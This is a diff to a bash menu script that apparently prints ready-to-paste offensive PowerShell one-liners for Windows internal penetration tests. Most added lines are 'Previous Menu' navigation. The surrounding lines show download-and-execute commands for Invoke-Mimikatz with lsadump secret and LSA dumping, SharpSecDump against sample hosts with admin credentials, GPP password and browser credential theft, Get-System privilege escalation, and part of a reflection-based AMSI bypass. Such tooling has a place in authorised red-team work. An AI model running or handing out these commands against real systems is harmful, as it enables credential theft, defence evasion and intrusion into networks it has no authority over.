@@ -86,7 +86,7 @@ echo -ne " What would you like to do?
         6)  ->  [ Privilege Escalation		]
         7)  ->  [ Recon 			]
         
-        a)  ->	[ AMSI Bypasses			]
+        A)  ->	[ AMSI Bypasses			]
         
 "
         read a
@@ -117,12 +117,15 @@ echo -ne " Select Alternate Authentication Material Type
 
         1)  ->  [ Pass the Hash			]
         2)  ->  [ Pass the Ticket		]
+                
+        Q)  ->	[Previous Menu			]
 "
 
         read a
         case $a in
                 1) 	Internal_Menu_Alternate_Authentication_Pass_Hash ;;
         	2) 	Internal_Menu_Alternate_Authentication_Pass_Ticket ;;
+        	q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -209,6 +212,8 @@ echo -ne " Select Credential Access Type
         3)  ->  [ Credentials from Group Policy		]
         4)  ->	[ Credentials from Web Browsers		]
         5)  -> 	[ Unsecured Credentials			]
+                
+        Q)  ->	[Previous Menu		    		]
 "
 
         read a
@@ -218,6 +223,7 @@ echo -ne " Select Credential Access Type
 	        3) 	Internal_Menu_Credential_Access_Credential_Group_Policy ;;
 	        4) 	Internal_Menu_Credential_Access_Credential_Web_Browsers ;;
 	        5) 	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
+	        q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -241,6 +247,8 @@ echo -ne " Select Credential Dumping Type
         3)  ->	[ LSASS Memory		    ]
         4)  -> 	[ NTDS			    ]
         5)  ->	[ SAM			    ]
+        
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -250,6 +258,7 @@ echo -ne " Select Credential Dumping Type
 	        3) 	Internal_Menu_Credential_Access_Credential_Dumping_LSASS_Memory ;;
 	        4) 	Internal_Menu_Credential_Access_Credential_Dumping_NTDS ;;
 	        5)	Internal_Menu_Credential_Access_Credential_Dumping_SAM ;;
+	        q|Q)	Internal_Menu_Credential_Access ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -273,6 +282,20 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mi
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
 }
 
 
@@ -289,6 +312,21 @@ echo -e "${IBLUE}Mimikatz${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"token::elevate"\" "\"lsadump::secrets"\"'"
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
 
 }
 
@@ -315,6 +353,21 @@ echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-Shar
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
+
 }
 
 
@@ -335,6 +388,21 @@ echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mi
 echo -e "$DownloadMethod "$EmpireRepo"credentials/Invoke-Mimikatz.ps1);Invoke-Mimikatz -Command '"\"lsadump::lsa /inject"\"'"
 echo -e ""
 echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
 
 }
 
@@ -359,6 +427,21 @@ echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-Shar
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10,10.10.10.20"\""
 echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-SharpSecDump -Command "\"-target=10.10.10.10 -u=admin -p=pass -d=security.local"\""
 echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Credential_Dumping ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 
 }
 
@@ -382,6 +465,19 @@ echo -e "$DownloadMethod "$NishangRepo"Gather/Get-WebCredentials.ps1);Get-WebCre
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
 
 Internal_Menu_Credential_Access_Credential_Group_Policy(){
@@ -404,7 +500,21 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-GPPPassword.ps1);Get-GPPPasswo
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
+
 
 Internal_Menu_Credential_Access_Credential_Web_Browsers(){
 
@@ -423,7 +533,21 @@ echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-Sharpweb.ps1);Invoke-Sharpw
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 }
+
 
 Internal_Menu_Credential_Access_Unsecured_Credentials(){
 
@@ -438,12 +562,15 @@ echo -ne " Select Unsecured Credentials Type
 
         1)  ->  [ Credentials in Files 		]
         2)  ->  [ Credentials in Registry	]
+        
+        Q)  ->	[Previous Menu			]
 "
 
         read a
         case $a in
                 1) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Files ;;
 	        2) 	Internal_Menu_Credential_Access_Credential_Unsecured_Credentials_Registry ;;
+	        q|Q)	Internal_Menu_Credential_Access ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -479,6 +606,19 @@ echo -e "$DownloadMethod $EmpireRepo"credentials/Invoke-SessionGopher.ps1");Invo
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 
@@ -514,6 +654,19 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/PowerUp.ps1);Get-UnattendedInstall
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Credential_Access_Unsecured_Credentials ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 
@@ -528,17 +681,20 @@ echo -ne " Select Recon Type
 
 
 
-        1)  ->  [ Domain Recon ]
-        2)  ->  [ File and Share Recon ]
-        3)  ->  [ Local Host Recon ] 
-        4)  ->  [ Network Recon ]
+        1)  ->  [ Domain Recon 		]
+        2)  ->  [ File and Share Recon 	]
+        3)  ->  [ Local Host Recon	] 
+        4)  ->  [ Network Recon 	]
+                 
+        Q)  ->	[Previous Menu		]
 "
         read a
         case $a in
-	        1) Internal_Menu_Recon_Domain ;;
-	        2) Internal_Menu_Recon_File_Share ;;
-	        3) Internal_Menu_Recon_Local_Host;;
-	        4) Internal_Menu_Recon_Network ;;
+	        1) 	Internal_Menu_Recon_Domain ;;
+	        2) 	Internal_Menu_Recon_File_Share ;;
+	        3) 	Internal_Menu_Recon_Local_Host;;
+	        4) 	Internal_Menu_Recon_Network ;;
+	        q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -592,6 +748,9 @@ echo -ne " Select Domain Recon Type
         8)  ->	[ Domain Trusts 		]
         9)  ->  [ Domain Users 			]
         T)  ->  [ Tools				]
+        
+                
+        Q)  ->	[Previous Menu		    	]
 "
         read a
         case $a in
@@ -634,10 +793,10 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Pat
 echo -e ""
 echo -e "" 
 
-echo -ne  "Return to Domain Recon Menu?
+echo -ne  "Return to Previous Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+     
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -667,8 +826,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+        
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -707,8 +866,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+     
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -745,8 +904,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+       
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -779,8 +938,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+      
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -820,8 +979,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+     
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -853,8 +1012,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+       
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -897,8 +1056,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+     
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -953,8 +1112,8 @@ echo -e ""
 
 echo -ne  "Return to Domain Recon Menu?
 
-
-        1)  ->  [ Domain Recon Menu ]
+      
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
@@ -1044,13 +1203,16 @@ echo -ne " Select Privilege Escalation Type
 
 
 
-        1)  ->  [ Checks ]
-        2)  ->  [ Exploits ]
+        1)  ->  [ Checks 	]
+        2)  ->  [ Exploits 	]
+                       
+        Q)  ->	[Previous Menu	]
 "
         read a
         case $a in
-	        1) Internal_Menu_Privilege_Escalation_Checks ;;
-	        2) Internal_Menu_Privilege_Escalation_Exploits ;;
+	        1) 	Internal_Menu_Privilege_Escalation_Checks ;;
+	        2) 	Internal_Menu_Privilege_Escalation_Exploits ;;
+	        q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1085,6 +1247,19 @@ echo -e "$DownloadMethod "$EmpireRepo"privesc/PrivescCheck.ps1);Invoke-PrivescCh
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 Internal_Menu_Privilege_Escalation_Exploits(){
@@ -1103,7 +1278,20 @@ echo -e "${IBLUE}Get-System${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Get-System.ps1);Get-System"
 echo -e ""
 echo -e ""   
-  
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	Internal_Menu_Privilege_Escalation ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+          
 }
 
 
@@ -1143,7 +1331,19 @@ echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-SharpSpray.ps1);Invoke-Shar
 echo -e ""
 echo -e ""
 
+echo -ne  "Return to Previous Menu?
 
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	Internal_Menu_Main ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
 }
 
 Internal_Menu_AMSI_Bypasses(){
@@ -1178,15 +1378,17 @@ $a=[Ref].Assembly.GetType($k)
 $a.GetField($r,'\'NonPublic,Static\'').SetValue($null,$true)
 '
 echo -e ""
-echo -ne  "Return to Internal Main Menu?
+echo -e ""
 
+echo -ne  "Return to Previous Menu?
 
-        1)  ->  [ Internal Main Menu ]
+    
+        Q)  ->	[Previous Menu		    ]
 "
 
         read a
         case $a in
-        	1) Internal_Menu_Main ;;
+        	q|Q) 	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
